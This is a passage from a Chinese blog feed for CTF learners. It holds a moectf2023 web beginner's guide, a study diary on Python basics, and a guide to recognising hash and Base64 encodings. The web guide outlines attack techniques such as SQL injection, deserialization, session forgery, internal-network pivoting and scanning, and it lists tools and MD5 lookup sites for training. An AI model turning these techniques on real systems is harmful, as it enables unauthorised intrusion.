    <content><![CDATA[<h1 id="moectf2023-web-入门指南"><a href="#moectf2023-web-入门指南" class="headerlink" title="moectf2023 web 入门指南"></a>moectf2023 web 入门指南</h1><p>Klutton</p>
<h1 id="知识和资源的获取"><a href="#知识和资源的获取" class="headerlink" title="知识和资源的获取"></a>知识和资源的获取</h1><p>前言</p>
<p>ctf知识的学习与课内一板一眼式的教书不同，如果你想要获得成长的能力，那么你 必须 获取 自主获取知识 的 能力，如果你是一个初学者，这是一个脱离以前填鸭式应试教育的学习模式，你需要不得不逐步适应新的学习 方式， 这样的能力不管在哪个方向，甚至在别的竞赛学科中，都是必要的 </p>
<p>这样的学习方式是受益终生的，不是吗？</p>
<h2 id="从公开资源获取知识和资源"><a href="#从公开资源获取知识和资源" class="headerlink" title="从公开资源获取知识和资源"></a>从公开资源获取知识和资源</h2><p>这个目录表是有难易顺序的，因为每一个途径都需要一定的经验和知识才能掌握</p>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>优先选择bing和google</p>
<p> 不会就先搜，搜索引擎的速度肯定比管理员回消息快</p>
<p> 在上面两引擎信息不足情况下考虑其他引擎</p>
<h3 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h3><p>随着时代的发展，从2023年（笔者确信）开始，无论国内外，语言模型的发展使得我们可以大概 地与人工智能沟通获取知识，人工智能不怕累、不怕麻烦，值得重复问一些简单问题</p>
<p>如果不知道怎么弄，请接着看下面的内容</p>
<h3 id="GitHub等开源社区"><a href="#GitHub等开源社区" class="headerlink" title="GitHub等开源社区"></a>GitHub等开源社区</h3><p>搜索关键词，可能有热心的开源作者汇集的一些某某大全形式的攻击载荷，忘了就去翻翻嘛</p>
<p>例子： </p>
<p>​		PayloadsAlltheThings —— payload大全 </p>
<p>​		vulhub的docker（需要会使用搭配相应漏洞知识）</p>
<p>如果觉得你访问的仓库有价值，不妨给仓库一个一个star</p>
<h3 id="从私下获取资源"><a href="#从私下获取资源" class="headerlink" title="从私下获取资源"></a>从私下获取资源</h3><p>有些知识在互联网上传播是有风险的，例如怎么上GitHub，我老是上不去，不妨私下问问你的室友如何解决 <del class="mask">或 者你可以陪我跑跑山吃吃饭的时候聊一聊</del></p>
<p>例如：chatgpt不允许国内访问；openai的账号注册需要外国手机号码</p>
<p>那你可以找朋友问一问，借一借</p>
<h3 id="从私下获取知识"><a href="#从私下获取知识" class="headerlink" title="从私下获取知识"></a>从私下获取知识</h3><p>那就和问老师问题一样嘛（而且老师还比同学多出来一个教人的义务），主要几点</p>
<p>不要问“在吗？”一类的字眼，言语谦逊地完整提出问题再等待答复 </p>
<p>被提问者不一定了解具体的细节，要及时补充要求的具体内容</p>
<p>如果被问者也不知道，请原谅他 </p>
<p>如果认为受益匪浅，不妨给出物质上的答谢</p>
<h4 id="综上，遇到不会的怎么办"><a href="#综上，遇到不会的怎么办" class="headerlink" title="综上，遇到不会的怎么办"></a>综上，遇到不会的怎么办</h4><p>把你认为是特征内容的复制下来 </p>
<p>扔给上面提到的资源</p>
<h2 id="如何练习"><a href="#如何练习" class="headerlink" title="如何练习"></a>如何练习</h2><h4 id="一些练习场"><a href="#一些练习场" class="headerlink" title="一些练习场"></a>一些练习场</h4><p>buuoj </p>
<p>bugku （可以看三哈师傅的网站了解更多平台）<a class="link"   href="https://www.su-sanha.cn/platforms" >https://www.su-sanha.cn/platforms<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>需要知道的：<strong>靶场分普通的ctf靶场，有的是awd或者awdp，有的则是给你一个虚拟机自己从头到尾拿下系统 权限（vulnhub）最前者是最基础的，如果想要了解完整真实的渗透流程，可以去尝试vulnhub这类网站</strong></p>
<h4 id="学会查看题解write-up（wp）"><a href="#学会查看题解write-up（wp）" class="headerlink" title="学会查看题解write up（wp）"></a>学会查看题解write up（wp）</h4><p>在平时的练习中，肯定会遇到不会的题，千万不要死磕，不会就看wp，下一道更好！ 在搜索引擎或者开源社 区查找wp，在看wp的过程中，补充并且掌握自己的不会的知识点</p>
<h3 id="如何配置环境"><a href="#如何配置环境" class="headerlink" title="如何配置环境"></a>如何配置环境</h3><p><strong>一定要有耐心！</strong> 一套环境不是十分钟二十分钟就能配完的，对于新手而言，几天甚至一两周都有可能，反复地 确认自己的步骤、教程的日期、教程使用的系统版本是否正确；</p>
<p>尽量选择官方网站的配置方式：寻找document字样去看文档，这是最稳的方法，但是比较费力； 可以去看私 人的文章，但不一定能成功</p>
<p><strong>熟能生巧</strong></p>
<p>可以自己尝试配置一套lamp环境，或者配一台虚拟机，运行一个docker</p>
<h3 id="一些知识清单"><a href="#一些知识清单" class="headerlink" title="一些知识清单"></a>一些知识清单</h3><p>编码</p>
<p>在网络传输中，数据被编码成为二进制内容经过网络传输之后解码，由于在这个过程中应用了不同的规则，只 有使用了相应的编码才能正确地解析内容，有很多编码形式需要你了解（正经和不正经的），在深度了解编码 规则后，你甚至可以自创独属于你的编码规则！</p>
<p>可供参考的资料：<a class="link"   href="https://www.cnblogs.com/ruoli-s/p/14206145.html" >https://www.cnblogs.com/ruoli-s/p/14206145.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>编程语言</p>
<p>当提到计算机，不可避免地需要了解编程，事实上，已经存在相当多主流的编程语言，有一些适用于提供和处 理web服务，例如python, java, php, golang, rust，你需要具备对于这些代码最少有审计能力（看得懂在做什么）</p>
<p>工具</p>
<p><strong>够用</strong>： </p>
<p>​	postman </p>
<p>​	burp </p>
<p>​	sqlmap</p>
<p><strong>计网知识</strong> </p>
<p>​	标准的OSI七层模型（其实了解tcp足矣） </p>
<p>​	了解 “协议”（例如http，https，ftp，gopher，也需要了解php伪协议）</p>
<p><strong>HTTP</strong> </p>
<p>​	请求方法（get&#x2F;post） </p>
<p>​	请求内容（json&#x2F;raw&#x2F;binary） </p>
<p>​	请求头（content-type&#x2F;xff&#x2F;referer&#x2F;cookie）</p>
<p><strong>服务框架</strong></p>
<p>​	有现成的网络框架用于高效并发处理请求，所以你需要了解函数是干嘛用的，怎么处理请求的</p>
<p>​		python: Flask, Django, Tornado </p>
<p>​		java: Spring Boot</p>
<p><strong>用户凭证</strong></p>
<p>​	http是无状态协议，因此需要储存处理用户信息，你需要了解：</p>
<p>​		cookie </p>
<p>​		session </p>
<p>​		jwt</p>
<p>​	有时会涉及到用户信息伪造，例如flask框架下的session伪造，通过获取（或者弱口令爆破）secret_key来伪造 一个session，通常需要自己写脚本（或者获取GitHub现成的脚本改一改使用）</p>
<p><strong>数据储存</strong></p>
<p>实际上，大部分持久化信息是储存在数据库的，有的出题人为了简化流程也会直接把信息储存在内存里</p>
<p><strong>数据库管理系统</strong>（DBMS）</p>
<p>​	你需要知道去哪儿了解不同DBMS的sql语法，以便完成相应的挑战：</p>
<p>​		sql injection注入：查询脚本由于过滤不严导致查询语句可控，用户得以访问数据库</p>
<p>​				有回显</p>
<p>​				盲注</p>
<p>​		文件读写：通过数据库进行文件的读写，可以配合起来getshell</p>
<p>（sql注入可以尝试sqlmap一把梭，前提是你找对了注入点）</p>
<p><strong>反序列化</strong></p>
<p>反序列化一直是一个离不开的话题，大体来说，序列化就是把内存里处理好的数据变成二进制内容（通常）用 来传输或储存；反序列化就是按照序列化的规则的把内容读取到内存中参与程序运行；如果反序列化不得当， 被恶意构造的内容就可能导致机器被”骇入”</p>
<p>xxe（xml外部实体攻击 libxml 2.8.0以下） </p>
<p>php反序列化（包括了解其中的魔术方法）</p>
<p>pickle反序列化（可能会有r指令过滤不过涉及出题不多）</p>
<p>java反序列化（pop链）</p>
<p><strong>CMS</strong></p>
<p>​		上网查吧（杂 </p>
<p>​		内网渗透</p>
<p><strong>代理工具</strong></p>
<p>配置socks代理，继续进行内网渗透 </p>
<p>​		nps </p>
<p>​		frp </p>
<p>​		proxifier </p>
<p>​		proxychains</p>
<p><strong>扫描工具</strong> </p>
<p>发现内网资产 </p>
<p>​		nmap</p>
<p>​		fscan</p>
<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>祝你能玩得愉快，学得愉快！</p>
<hr>
<p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303d</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF入门指北</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习日记（每天学点新东西，就是成功）</title>
    <url>/posts/cdf7e434.html</url>
    <content><![CDATA[<p>（坚持一天一更新……可能吧）</p>
<h1 id="2023年12月11日"><a href="#2023年12月11日" class="headerlink" title="2023年12月11日"></a>2023年12月11日</h1><p>今天学点不一样的</p>
<p>bat批处理相关知识</p>
<p>每次都要输入命令，我干脆直接用bat批处理，点一下就好了</p>
<p><a class="link"   href="https://blog.csdn.net/qq_41428418/article/details/132438144#/" >https://blog.csdn.net/qq_41428418/article/details/132438144#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/s_y_w123/article/details/111353912#/" >https://blog.csdn.net/s_y_w123/article/details/111353912#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/Aloxaf/MirageTankGo#/" >https://github.com/Aloxaf/MirageTankGo#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>解决了我没解决的问题</p>
<p>get√</p>
<h1 id="2023年12月9日"><a href="#2023年12月9日" class="headerlink" title="2023年12月9日"></a>2023年12月9日</h1><p>文件头文件尾的知识点<a class="link"   href="https://w1ndys.top/2023/12/09/CTF-misc-fileheader/#/" >https://w1ndys.top/2023/12/09/CTF-misc-fileheader/#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="2023年11月14日"><a href="#2023年11月14日" class="headerlink" title="2023年11月14日"></a>2023年11月14日</h1><p>今天打技能兴鲁省赛线上初赛，有个很有意思的杂项题，附件解压是一个日历表</p>
<h1 id="2023年11月13日"><a href="#2023年11月13日" class="headerlink" title="2023年11月13日"></a>2023年11月13日</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><ul>
<li>Python字符串，列表，元组，字典的区别</li>
</ul>
<p>特别提一下：</p>
<p>flag创建为列表的时候用join函数拼接</p>
<p>flag创建为字符串的时候用+&#x3D;拼接</p>
<h3 id="Python-字符串"><a href="#Python-字符串" class="headerlink" title="Python 字符串"></a>Python 字符串</h3><p>字符串是 Python 中最常用的数据类型。我们可以使用引号 ( <strong>‘</strong> 或 <strong>“</strong> ) 来创建字符串。</p>
<p>创建字符串很简单，只要为变量分配一个值即可。例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var1 = &#x27;Hello World!&#x27;</span><br><span class="line">var2 = &quot;Python Runoob&quot;</span><br></pre></td></tr></table></figure></div>

<h3 id="Python-列表-List"><a href="#Python-列表-List" class="headerlink" title="Python 列表(List)"></a>Python 列表(List)</h3><p>序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。</p>
<p>Python有6个序列的内置类型，但最常见的是列表和元组。</p>
<p>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</p>
<p>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</p>
<p>列表是最常用的Python数据类型，它可以作为一个方括号内的逗号分隔值出现。</p>
<p>列表的数据项不需要具有相同的类型</p>
<p>创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：</p>
<p>list1 &#x3D; [‘physics’, ‘chemistry’, 1997, 2000] list2 &#x3D; [1, 2, 3, 4, 5 ] list3 &#x3D; [“a”, “b”, “c”, “d”]</p>
<p>与字符串的索引一样，列表索引从0开始。列表可以进行截取、组合等。</p>
<h3 id="Python-元组"><a href="#Python-元组" class="headerlink" title="Python 元组"></a>Python 元组</h3><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p>
<p>元组使用小括号，列表使用方括号。</p>
<p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</p>
<p>如下实例：</p>
<h4 id="实例-Python-2-0"><a href="#实例-Python-2-0" class="headerlink" title="实例(Python 2.0+)"></a>实例(Python 2.0+)</h4><p>tup1 &#x3D; (‘physics’, ‘chemistry’, 1997, 2000) tup2 &#x3D; (1, 2, 3, 4, 5 ) tup3 &#x3D; “a”, “b”, “c”, “d”</p>
<p>创建空元组</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tup1 = ()</span><br></pre></td></tr></table></figure></div>

<p>元组中只包含一个元素时，需要在元素后面添加逗号</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tup1 = (50,)</span><br></pre></td></tr></table></figure></div>

<p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p>
<h3 id="Python-字典-Dictionary"><a href="#Python-字典-Dictionary" class="headerlink" title="Python 字典(Dictionary)"></a>Python 字典(Dictionary)</h3><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
<p>字典的每个键值 <strong>key:value</strong> 对用冒号 <strong>:</strong> 分割，每个键值对之间用逗号 <strong>,</strong> 分割，整个字典包括在花括号 <strong>{}</strong> 中 ,格式如下所示：</p>
<p>d &#x3D; {key1 : value1, key2 : value2 }</p>
<p><strong>注意：****dict</strong> 作为 Python 的关键字和内置函数，变量名不建议命名为 <strong>dict</strong>。</p>
<p>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一。</p>
<p>&gt;&gt;&gt; tinydict &#x3D; {‘a’: 1, ‘b’: 2, ‘b’: ‘3’}<br>&gt;&gt;&gt; tinydict[‘b’]<br>‘3’<br>&gt;&gt;&gt; tinydict<br>{‘a’: 1, ‘b’: ‘3’}</p>
<p>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。</p>
<p>一个简单的字典实例：</p>
<p>tinydict &#x3D; {‘Alice’: ‘2341’, ‘Beth’: ‘9102’, ‘Cecil’: ‘3258’}</p>
<p>也可如此创建字典：</p>
<p>tinydict1 &#x3D; { ‘abc’: 456 } tinydict2 &#x3D; { ‘abc’: 123, 98.6: 37 }</p>
<h1 id="2023年11月11日"><a href="#2023年11月11日" class="headerlink" title="2023年11月11日"></a>2023年11月11日</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>Python逆序输出</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(flag[::-1])</span><br></pre></td></tr></table></figure></div>

<p>实际上这是切片的一些操作</p>
<p><a class="link"   href="https://blog.csdn.net/qq_30460949/article/details/118888961" >Python切片操作_小魔王降临的博客-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CTF学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码学常见密码形式</title>
    <url>/posts/965c7bf3.html</url>
    <content><![CDATA[<blockquote>
<p>声明：本文基于<a class="link"   href="https://cloud.tencent.com/developer/article/1748394" >https://cloud.tencent.com/developer/article/1748394<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这篇文章进行修改，转载请注明来源，感谢支持</p>
<p>未写完，持续更新中……</p>
</blockquote>
<h1 id="MD5、sha1、HMAC算法、NTLM等相似加密类型"><a href="#MD5、sha1、HMAC算法、NTLM等相似加密类型" class="headerlink" title="MD5、sha1、HMAC算法、NTLM等相似加密类型"></a>MD5、sha1、HMAC算法、NTLM等相似加密类型</h1><h2 id="常用解密网站"><a href="#常用解密网站" class="headerlink" title="常用解密网站"></a>常用解密网站</h2><ul>
<li><a class="link"   href="https://www.somd5.com/" >https://www.somd5.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://pmd5.com/" >https://pmd5.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://www.ttmd5.com/%EF%BC%88%E5%B8%A6%E6%89%B9%E9%87%8F%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7%EF%BC%89" >http://www.ttmd5.com/（带批量解密工具）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="1、MD5——示例21232F297A57A5A743894A0E4A801FC3"><a href="#1、MD5——示例21232F297A57A5A743894A0E4A801FC3" class="headerlink" title="1、MD5——示例21232F297A57A5A743894A0E4A801FC3"></a>1、MD5——示例<code>21232F297A57A5A743894A0E4A801FC3</code></h2><p><strong>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串</strong>，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。</p>
<p>根据md5加密后的特征（md5加密后是16位或者32位的字符，由字母和数字组成，字母大小写统一）可以尝试md5解密。<br>（TIP：有时候我们获得到的 md5 是 16 位的，其实那 16 位是 32 位 md5 的长度，是从 32 位 md5 值来的。是将 32 位 md5 去掉前八位，去掉后八位得到的）</p>
<p><strong>md5的三个特征：</strong></p>
<ol>
<li><strong>确定性</strong>：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。</li>
<li><strong>碰撞性</strong>：原始数据与其MD5值并不是一一对应的，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。</li>
<li><strong>不可逆</strong>：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够强，这是由它的算法所决定的。因为根据第2点，一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</li>
</ol>
<h2 id="2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997"><a href="#2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997" class="headerlink" title="2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997"></a>2、sha1——示例<code>d033e22ae348aeb5660fc2140aec35850c4da997</code></h2><p>这种加密的密文特征跟MD5差不多，只不过位数是40</p>
<h2 id="3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65"><a href="#3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65" class="headerlink" title="3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65"></a>3、HMAC算法——示例<code>5b696ae7da9442ead7adc24d03cedb65</code></h2><p>HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
<h2 id="3、NTLM——示例209c6174da490caeb422f3fa5a7ae634"><a href="#3、NTLM——示例209c6174da490caeb422f3fa5a7ae634" class="headerlink" title="3、NTLM——示例209c6174da490caeb422f3fa5a7ae634"></a>3、NTLM——示例<code>209c6174da490caeb422f3fa5a7ae634</code></h2><p>这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p>
<h2 id="相似加密类型"><a href="#相似加密类型" class="headerlink" title="相似加密类型"></a>相似加密类型</h2><table>
<thead>
<tr>
<th align="left">#</th>
<th align="left">算法</th>
<th align="left">长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">md5</td>
<td align="left">32&#x2F;16</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">sha1</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">sha256</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">sha512</td>
<td align="left">128</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">adler32</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">crc32</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">crc32b</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">fnv132</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">fnv164</td>
<td align="left">16</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left">fnv1a32</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left">fnv1a64</td>
<td align="left">16</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left">gost</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left">gost-crypto</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left">haval128,3</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left">haval128,4</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left">haval128,5</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left">haval160,3</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left">haval160,4</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">19</td>
<td align="left">haval160,5</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">20</td>
<td align="left">haval192,3</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">21</td>
<td align="left">haval192,4</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">22</td>
<td align="left">haval192,5</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">23</td>
<td align="left">haval224,3</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">24</td>
<td align="left">haval224,4</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">25</td>
<td align="left">haval224,5</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">26</td>
<td align="left">haval256,3</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">27</td>
<td align="left">haval256,4</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">28</td>
<td align="left">haval256,5</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">29</td>
<td align="left">joaat</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">30</td>
<td align="left">md2</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">31</td>
<td align="left">md4</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">32</td>
<td align="left">ripemd128</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">33</td>
<td align="left">ripemd160</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">34</td>
<td align="left">ripemd256</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">35</td>
<td align="left">ripemd320</td>
<td align="left">80</td>
</tr>
<tr>
<td align="left">36</td>
<td align="left">sha224</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">37</td>
<td align="left">sha3-224</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">38</td>
<td align="left">sha3-256</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">39</td>
<td align="left">sha3-384</td>
<td align="left">96</td>
</tr>
<tr>
<td align="left">40</td>
<td align="left">sha3-512</td>
<td align="left">128</td>
</tr>
<tr>
<td align="left">41</td>
<td align="left">sha384</td>
<td align="left">96</td>
</tr>
<tr>
<td align="left">42</td>
<td align="left">sha512&#x2F;224</td>
<td align="left">56</td>
</tr>
<tr>
<td align="left">43</td>
<td align="left">sha512&#x2F;256</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">44</td>
<td align="left">snefru</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">45</td>
<td align="left">snefru256</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">46</td>
<td align="left">tiger128,3</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">47</td>
<td align="left">tiger128,4</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">48</td>
<td align="left">tiger160,3</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">49</td>
<td align="left">tiger160,4</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">50</td>
<td align="left">tiger192,3</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">51</td>
<td align="left">tiger192,4</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">52</td>
<td align="left">whirlpool</td>
<td align="left">128</td>
</tr>
<tr>
<td align="left">53</td>
<td align="left">mysql</td>
<td align="left">老MYSQL数据库用的，16位，且第1位和第7位必须为0-8</td>
</tr>
<tr>
<td align="left">54</td>
<td align="left">mysql5</td>
<td align="left">40</td>
</tr>
<tr>
<td align="left">55</td>
<td align="left">NTLM</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">56</td>
<td align="left">Domain Cached Credentials</td>
<td align="left">32</td>
</tr>
</tbody></table>
<h1 id="Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型"><a href="#Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型" class="headerlink" title="Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型"></a>Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型</h1><h2 id="1、Base64——示例YWRtaW4tcm9vdA"><a href="#1、Base64——示例YWRtaW4tcm9vdA" class="headerlink" title="1、Base64——示例YWRtaW4tcm9vdA=="></a>1、Base64——示例<code>YWRtaW4tcm9vdA==</code></h2><p><strong>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</strong></p>
<p>Base64编码要求把3个8位字节（3<em>8&#x3D;24）转化为4个6位的字节（4</em>6&#x3D;24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用‘&#x3D;’，因此编码后输出的文本末尾可能会出现1或2个‘&#x3D;’，如图。</p>
<p>为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6&#x3D;64，这也是Base64名称的由来。</p>
<p><strong>Base64编码表</strong></p>
<table>
<thead>
<tr>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
<th align="left">码值</th>
<th align="left">字符</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">A</td>
<td align="left">8</td>
<td align="left">I</td>
<td align="left">16</td>
<td align="left">Q</td>
<td align="left">24</td>
<td align="left">Y</td>
<td align="left">32</td>
<td align="left">g</td>
<td align="left">40</td>
<td align="left">o</td>
<td align="left">48</td>
<td align="left">w</td>
<td align="left">56</td>
<td align="left">4</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">B</td>
<td align="left">9</td>
<td align="left">J</td>
<td align="left">17</td>
<td align="left">R</td>
<td align="left">25</td>
<td align="left">Z</td>
<td align="left">33</td>
<td align="left">h</td>
<td align="left">41</td>
<td align="left">p</td>
<td align="left">49</td>
<td align="left">x</td>
<td align="left">57</td>
<td align="left">5</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">C</td>
<td align="left">10</td>
<td align="left">K</td>
<td align="left">18</td>
<td align="left">S</td>
<td align="left">26</td>
<td align="left">a</td>
<td align="left">34</td>
<td align="left">i</td>
<td align="left">42</td>
<td align="left">q</td>
<td align="left">50</td>
<td align="left">y</td>
<td align="left">58</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">D</td>
<td align="left">11</td>
<td align="left">L</td>
<td align="left">19</td>
<td align="left">T</td>
<td align="left">27</td>
<td align="left">b</td>
<td align="left">35</td>
<td align="left">j</td>
<td align="left">43</td>
<td align="left">r</td>
<td align="left">51</td>
<td align="left">z</td>
<td align="left">59</td>
<td align="left">7</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">E</td>
<td align="left">12</td>
<td align="left">M</td>
<td align="left">20</td>
<td align="left">U</td>
<td align="left">28</td>
<td align="left">c</td>
<td align="left">36</td>
<td align="left">k</td>
<td align="left">44</td>
<td align="left">s</td>
<td align="left">52</td>
<td align="left">0</td>
<td align="left">60</td>
<td align="left">8</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">F</td>
<td align="left">13</td>
<td align="left">N</td>
<td align="left">21</td>
<td align="left">V</td>
<td align="left">29</td>
<td align="left">d</td>
<td align="left">37</td>
<td align="left">l</td>
<td align="left">45</td>
<td align="left">t</td>
<td align="left">53</td>
<td align="left">1</td>
<td align="left">61</td>
<td align="left">9</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">G</td>
<td align="left">14</td>
<td align="left">O</td>
<td align="left">22</td>
<td align="left">W</td>
<td align="left">30</td>
<td align="left">e</td>
<td align="left">38</td>
<td align="left">m</td>
<td align="left">46</td>
<td align="left">u</td>
<td align="left">54</td>
<td align="left">2</td>
<td align="left">62</td>
<td align="left">+</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">H</td>
<td align="left">15</td>
<td align="left">P</td>
<td align="left">23</td>
<td align="left">X</td>
<td align="left">31</td>
<td align="left">f</td>
<td align="left">39</td>
<td align="left">n</td>
<td align="left">47</td>
<td align="left">v</td>
<td align="left">55</td>
<td align="left">3</td>
<td align="left">63</td>
<td align="left">&#x2F;</td>
</tr>
